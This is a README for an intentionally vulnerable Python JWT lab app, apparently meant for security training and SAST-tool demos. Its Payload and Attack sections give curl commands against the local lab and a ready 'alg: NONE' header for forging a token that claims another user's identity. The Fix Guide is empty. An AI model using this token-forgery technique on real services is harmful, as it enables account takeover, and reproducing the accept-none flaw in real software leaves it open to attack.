# Python-JWT-Hs256-None

JSON Web Token (JWT) is an open standard (RFC 7519) that defines a compact and self-contained way for securely transmitting information between parties as a JSON object. This information can be verified and trusted because it is digitally signed. JWTs can be signed using a secret (with the HMAC algorithm) or a public/private key pair using RSA.

https://jwt.io/

## Owasp

https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.md


## SAST Tools : 

Find With SAST Tools : SonarQube Develpoer Plan

![Getting Started](11.png)



Find With SAST Tools : My Yml Script




![Getting Started](2.png)



## Setup

install from my dockerhub : https://hub.docker.com/r/mhnamadi/jwt-none


    docker run -ti -p 8008:5000 mhnamadi/jwt-none


## Payload 

* curl --header "Content-Type: application/json" --request POST --data '{"username":"admin","password":"admin"}' http://localhost:5000/auth


* curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:5000/protected

* Null cipher header: eyJ0eXAiOiJKV1QiLCAiYWxnIjoiTk9ORSJ9.

## Attack


1 . curl --header "Content-Type: application/json" --request POST --data '{"username":"user","password":"user"}' http://localhost:8008/auth

{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDQ4NTQyODUsImlhdCI6MTY0NDg1Mzk4NSwibmJmIjoxNjQ0ODUzOTg1LCJpZGVudGl0eSI6MX0.mBCLVmIjOQT4a596r7sHvKgPm60ZgZjXBzSGZPKLRp0"

2 . curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:8008/protected


3 . curl --header "Content-Type: application/json" --request POST --data '{"username":"user2","password":"user2"}' http://localhost:8008/auth

{
  "access_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDQ4NTQzNTcsImlhdCI6MTY0NDg1NDA1NywibmJmIjoxNjQ0ODU0MDU3LCJpZGVudGl0eSI6Mn0.6EdraNQoS8p9lsCzbmSm4XOEg4pQKwFfGoEq85le8sA"

4 . curl -i -H "Accept: application/json" -H "Authorization: JWT " http://localhost:8008/protected


5 . Change ID 1 to 2 and add Null payload on https://jwt.io/ 


6. Add Null cipher header: eyJ0eXAiOiJKV1QiLCAiYWxnIjoiTk9ORSJ9. 






![Getting Started](12.png)




## Fix Guide :  



## Contributing : 
 
We encourage you to contribute to Project

## Twitter Contributor :

   https://
